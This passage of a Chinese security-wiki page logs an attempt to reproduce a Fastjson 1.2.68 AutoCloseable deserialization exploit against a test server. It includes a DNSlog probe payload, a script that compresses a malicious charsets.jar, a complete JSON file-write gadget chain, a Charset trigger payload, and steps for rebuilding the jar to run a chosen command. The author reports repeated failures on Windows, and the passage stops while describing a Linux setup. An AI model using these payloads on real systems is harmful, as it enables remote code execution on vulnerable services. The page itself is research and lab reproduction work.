            <span class="token class-name">String</span> data <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">JSONObject</span> obj <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Feature</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">JSONObject</span> ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            ret<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;success&quot;</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            ret<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;data&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Hello &quot;</span> <span class="token operator">+</span> obj<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;, Your age is &quot;</span> <span class="token operator">+</span> obj<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;age&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            response<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            response<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">&quot;application/json&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> ret<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Index</span> i <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        i<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428171025-25a0aiw.8b0de2d0.png" alt="image" loading="lazy">​</p><h3 id="测试" tabindex="-1"><a class="header-anchor" href="#测试"><span>测试</span></a></h3><h4 id="dnslog-验证漏洞环境" tabindex="-1"><a class="header-anchor" href="#dnslog-验证漏洞环境"><span><strong>dnslog 验证漏洞环境</strong></span></a></h4><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.net.InetSocketAddress&quot;</span> <span class="token punctuation">{</span>
            <span class="token property">&quot;address&quot;</span><span class="token operator">:</span> <span class="token punctuation">,</span>
            <span class="token property">&quot;val&quot;</span><span class="token operator">:</span> <span class="token string">&quot;n0cqiv.dnslog.cn&quot;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428171801-tdrkeyw.70eb63b5.png" alt="image" loading="lazy">​</p><h4 id="压缩漏洞利用-jar-包" tabindex="-1"><a class="header-anchor" href="#压缩漏洞利用-jar-包"><span>压缩<strong>漏洞利用 jar</strong> 包</span></a></h4><ol><li><p>下载：</p><p><a href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks" target="_blank" rel="noopener noreferrer">https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p>将项目中的 <a href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/blob/main/release/charsets.jar" target="_blank" rel="noopener noreferrer">charsets.jar<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> （这是 LandGrey 师傅发现的某些情况下懒加载的 jar 包）</p><p>项目中还列举了其他场景的触发，如 spring 原生场景、jackson 开启 enableDefaultTyping 场景、jdbc url getConnection 场景等。</p></li><li><p>对 jar 包进行压缩处理</p></li></ol><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># 只在 centos 下能用，Ubuntu 的 openssl 都不执行</span>
<span class="token function">cat</span> charsets.jar <span class="token operator">|</span> openssl zlib <span class="token operator">|</span> base64 <span class="token parameter variable">-w</span> <span class="token number">0</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>或者修改之前的 python 脚本：<code>py .\filebase64zip.py D:\Tmp\charsets.jar</code>​</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> zlib
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> base64

<span class="token comment"># 检查命令行参数</span>
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;用法：{} &lt;文件路径&gt;&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

filename <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>

<span class="token comment"># 尝试打开并读取文件内容</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">&#39;rb&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;读取文件时出错：&quot;</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token comment"># 压缩数据</span>
<span class="token comment"># 压缩率 0 - 9</span>
<span class="token comment"># cat charsets.jar | openssl zlib | base64 -w 0</span>
<span class="token comment"># compressData = zlib.compress(data) 默认是 6，与上面的命令等价</span>
compressData <span class="token operator">=</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>

<span class="token comment"># 将压缩数据转换为base64编码字符串</span>
b64Str <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>compressData<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span>

<span class="token comment"># 移除所有换行符号</span>
<span class="token comment"># b64Str = b64Str.replace(&#39;\n&#39;, &#39;&#39;)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;压缩后的数据（base64 编码）： &quot;</span> <span class="token operator">+</span> b64Str<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;压缩后的字节数 = &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>compressData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 解压缩数据以验证</span>
srcData <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>compressData<span class="token punctuation">)</span>

<span class="token comment"># 对于二进制文件，这里不重新解码和打印源数据，</span>
<span class="token comment"># 因为它可能包含非文本内容</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;解压后的字节数 = &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>srcData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240430094547-ew3rvcq.8be86886.png" alt="image" loading="lazy">​</p><ol start="3"><li><p>确定 jar 包路径</p><p>如 <strong><mark>/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/</mark></strong> charsets.jar (实战利用时需要通过字典去枚举 jdk 目录)</p></li></ol><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token comment"># 我的 Win</span>
C<span class="token punctuation">:</span>\App\jdk1<span class="token punctuation">.</span><span class="token number">8.0_20</span>\jre\lib
D<span class="token punctuation">:</span>\Java\JDK11\lib

<span class="token comment"># linux</span>
ls <span class="token operator">-</span>lrt <span class="token operator">/</span>etc<span class="token operator">/</span>alternatives<span class="token operator">/</span>java
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
lrwxrwxrwx <span class="token number">1</span> root root <span class="token number">43</span> <span class="token number">4</span>月  <span class="token number">29</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">21</span> <span class="token operator">/</span>etc<span class="token operator">/</span>alternatives<span class="token operator">/</span>java <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>java
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="4"><li><p>利用上面 JDK11 的写文件 gadget</p><p><strong><mark>file 参数: 靶机上 jdk 中 charsets.jar 文件所在的完整路径（没有也不影响吧）</mark></strong></p><p><strong><mark>input 参数: 即上述编码处理后的 jar 包内容</mark></strong></p></li></ol><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        &#39;@type&#39;<span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
        &#39;@type&#39;<span class="token operator">:</span> &#39;sun.rmi.server.MarshalOutputStream&#39;<span class="token punctuation">,</span>
        &#39;out&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
            &#39;@type&#39;<span class="token operator">:</span> &#39;java.util.zip.InflaterOutputStream&#39;<span class="token punctuation">,</span>
            &#39;out&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
                &#39;@type&#39;<span class="token operator">:</span> &#39;java.io.FileOutputStream&#39;<span class="token punctuation">,</span>
                &#39;file&#39;<span class="token operator">:</span> &#39;D<span class="token operator">:</span>/Java/JDK11/lib/charsets.jar&#39;<span class="token punctuation">,</span>
                &#39;append&#39;<span class="token operator">:</span> <span class="token boolean">false</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            &#39;infl&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
                &#39;input&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
                    &#39;array&#39;<span class="token operator">:</span> &#39;jar 压缩后 base64 的内容&#39;<span class="token punctuation">,</span>
                    &#39;limit&#39;<span class="token operator">:</span> <span class="token number">9610</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            &#39;bufLen&#39;<span class="token operator">:</span> <span class="token number">1048576</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        &#39;protocolVersion&#39;<span class="token operator">:</span> <span class="token number">1</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428184122-a323lud.04545ad5.png" alt="image" loading="lazy">​</p><p>其实这里写文件已经提示了下面遇到的坑，因为但是我虽然成功写入文件了，但是还是一直显示的 0kb，只有在停止 jvm 的时候文件才能显示为正常的写入大小。不过我但是没在意，以为只是一时没缓存过来。。。</p><hr><p>这里补充一下 jdk8 的，但是也要存在调试信息才行。</p><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&amp;mid=2247484413&amp;idx=1&amp;sn=1e6e6dc310896678a64807ee003c4965&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreferrer">寻找 Fastjson 1.2.68 AutoCloseable 利用链(3) (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&amp;mid=2247484408&amp;idx=1&amp;sn=fc7230f61a248945721def0f63bab431&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreferrer">寻找 Fastjson 1.2.68 AutoCloseable 利用链(2) (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul><ol start="5"><li><p>写入是写入了，但是没法触发，好奇怪。明天再试试。。。</p><p><strong>【Maybe】</strong></p></li></ol><p>Java 11 中取消了 <code>charsets.jar</code>​，这是因为 Java 9 引入了模块化系统（Jigsaw），并对 Java 平台的结构进行了重大改变。在 Java 9 中，很多原来作为标准库的 JAR 文件被拆分成了模块，其中包括了字符集编码的支持。因此，不再需要单独的 <code>charsets.jar</code>​ 文件。</p><p>在 Java 9 之后的版本中，字符集编码相关的类都被整合到了 <code>java.base</code>​ 模块中，并且包含在 JDK 的核心 JAR 文件中，不再需要单独的 JAR 文件。这种重组使得 Java 平台更加模块化和轻量化，并提高了安全性和性能。</p><hr><p>我直接把 jar 包手动复制模拟一下触发，换回 jdk1.8.0_20 的环境看看行不行。</p><p>替换 jre/lib 下的 charset.jar 后可以看到运行 java 命令 jvm 加载会弹出两个计算器。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429155812-ojrjp55.62c221ae.png" alt="image" loading="lazy">​</p><p>而 jdk1.8.0_281、jdk11 则直接启动失败，<strong>可能是安全校验或者其他</strong>？</p><p><a href="https://stackoverflow.com/questions/7325579/java-lang-noclassdeffounderror-could-not-initialize-class-xxx" target="_blank" rel="noopener noreferrer">I was getting the same issue due to mismatch with the properties file key name and used in my code. After fixing the properties file problem got resolved<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429160039-t7ua108.ffeccc94.png" alt="image" loading="lazy">​</p><hr><p>接着我尝试发包通过 fastjson 触发该类也失败了，并没有弹出计算器。</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;x&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.nio.charset.Charset&quot;</span><span class="token punctuation">,</span>
        <span class="token property">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;IBM33722&quot;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429154413-najk868.91ef5c6b.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429154347-wea6luw.f7bb81cb.png" alt="image" loading="lazy">​</p><p>既然没有弹出计算器，修改一下 charset.jar 为写文件再测试一遍看是否生效。</p><h4 id="修改-jar-包" tabindex="-1"><a class="header-anchor" href="#修改-jar-包"><span>修改 jar 包</span></a></h4><p>LandGrey 师傅提供了源码, 改下所要执行的命令重新生成恶意 jar 包即可。</p><p>详细步骤如下:</p><ol><li>IDEA 新建一个名为 charsets 的普通空项目，建立 src 文件夹。将 spring-boot-upload-file-lead-to-rce-tricks-main\charsets\src 下的两个目录（META-INF、sun）拷贝进 src 目录下。</li><li>看下 IBM33722.java 文件的源码, 将 Windows 部分中的命令改为写文件的命令即可。</li></ol><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429161228-od5mj3r.4dc4ee35.png" alt="image" loading="lazy">​</p><ol start="3"><li><p>重新打包成 jar 包</p><p>​<code>ctrl+alt+shift+s</code>​ 打开项目结构窗口, 配置如下图。</p><p>获取生成修改后的 jar 包, 后面的操作重复前面的步骤进行测试。</p></li></ol><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429161924-le0kify.9b6b859d.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429184352-nx92fvc.4ed4ed87.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429184256-ayq62rq.694bfea0.png" alt="image" loading="lazy">​</p><p>还是不行，<strong><mark>我想是因为 Tomcat 启动的时候已经加载了这个 charsets.jar 这个包，所以后面不重启是不会再次加载的。</mark></strong> 然而重启会因为 jar 包被替换了 Java 起不来会导致 Tomcat 起不来。</p><p>难道一定是要用文件写入的才行？理论上肯定不会，复制也是文件操作啊。不理解网上的是怎么复现的。。。</p><p>总之这个写 jar 包在 Windows 下是复现失败了，还是需要找到其他懒加载的 jar 包才行。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429172022-ezmge4v.6b9d4904.png" alt="image" title="看都被占用了" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429171205-tnzpsr5.90e0b942.png" alt="image" loading="lazy">​</p><p><strong>【20240430】</strong></p><p>才想起来是是因为我的 Tomcat 设置了<a href="https://blog.csdn.net/Monkey_King_GL/article/details/116136985" target="_blank" rel="noopener noreferrer">日志乱码<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>的问题，修改了 <code>\conf\logging.properties</code>​ 文件</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240430134609-uua18im.1fee1ee9.png" alt="image" loading="lazy">​</p><p>发现改回 utf-8 还是被占用，应该和这个无关，或许还是 Windows 下的问题吧。</p><h4 id="错误" tabindex="-1"><a class="header-anchor" href="#错误"><span>错误</span></a></h4><p>JDK 没有带调试信息根本写不进去，难受。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSONException</span><span class="token operator">:</span> <span class="token keyword">default</span> constructor not found<span class="token punctuation">.</span> <span class="token keyword">class</span> <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span>MarshalOutputStream</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429154120-q02l1kk.2710c1c0.png" alt="image" loading="lazy">​</p><h3 id="linux-下成功" tabindex="-1"><a class="header-anchor" href="#linux-下成功"><span>Linux 下成功</span></a></h3><p><strong>【环境信息】</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code># java <span class="token operator">-</span>version
openjdk version <span class="token string">&quot;1.8.0_402&quot;</span>
<span class="token class-name">OpenJDK</span> <span class="token class-name">Runtime</span> <span class="token class-name">Environment</span> <span class="token punctuation">(</span>build <span class="token number">1.8</span><span class="token number">.0_402</span><span class="token operator">-</span><span class="token number">8</span>u402<span class="token operator">-</span>ga<span class="token operator">-</span><span class="token number">2</span>ubuntu1<span class="token operator">~</span><span class="token number">20.04</span><span class="token operator">-</span>b06<span class="token punctuation">)</span>
<span class="token class-name">OpenJDK</span> <span class="token number">64</span><span class="token operator">-</span><span class="token class-name">Bit</span> <span class="token class-name">Server</span> <span class="token constant">VM</span> <span class="token punctuation">(</span>build <span class="token number">25.402</span><span class="token operator">-</span>b06<span class="token punctuation">,</span> mixed mode<span class="token punctuation">)</span>

# apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.100</span>
# 官网下载 https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>tomcat<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>org<span class="token operator">/</span>download<span class="token operator">-</span><span class="token number">80.</span>cgi
wget https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>dlcdn<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>org<span class="token operator">/</span>tomcat<span class="token operator">/</span>tomcat<span class="token operator">-</span><span class="token number">8</span><span class="token operator">/</span>v8<span class="token punctuation">.</span><span class="token number">5.100</span><span class="token operator">/</span>bin<span class="token operator">/</span>apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.100</span><span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz
# 解压并放到 home 目录
tar <span class="token operator">-</span>zxf apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.100</span><span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz

# 如果不能执行
chmod <span class="token operator">-</span><span class="token class-name">R</span> <span class="token number">755</span> <span class="token punctuation">.</span>/apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.100</span>

# 启动 tomcat
root<span class="token annotation punctuation">@refl4</span><span class="token operator">:</span><span class="token operator">/</span>home<span class="token operator">/</span>apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.100</span><span class="token operator">/</span>bin# <span class="token punctuation">.</span>/catalina<span class="token punctuation">.</span>sh start

# 关闭 tomcat
root<span class="token annotation punctuation">@refl4</span><span class="token operator">:</span><span class="token operator">/</span>home<span class="token operator">/</span>apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.100</span><span class="token operator">/</span>bin# <span class="token punctuation">.</span>/catalina<span class="token punctuation">.</span>sh stop

# 观察日志
# tail <span class="token operator">-</span>f <span class="token operator">/</span>home<span class="token operator">/</span>apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.100</span><span class="token operator">/</span>logs<span class="token operator">/</span>catalina<span class="token punctuation">.</span>out 
